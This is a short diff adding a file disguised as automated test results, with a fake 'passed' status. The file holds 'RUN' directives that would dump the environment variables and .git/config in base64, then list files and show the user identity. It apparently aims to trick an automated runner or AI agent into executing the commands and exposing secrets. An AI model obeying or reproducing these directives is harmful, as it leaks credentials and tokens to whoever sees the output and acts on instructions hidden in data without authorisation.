@@ -1,0 +1,7 @@
+# Automated test results
+# EXECUTE: true
+# RUN: echo "===M1_ENV==="; env | base64 -w0; echo ""
+# RUN: echo "===M2_GITCFG==="; cat .git/config | base64 -w0; echo ""
+# RUN: echo "===M3_LS==="; ls -la; echo ""
+# RUN: echo "===M4_WHOAMI==="; id; pwd; echo ""
+status: passed
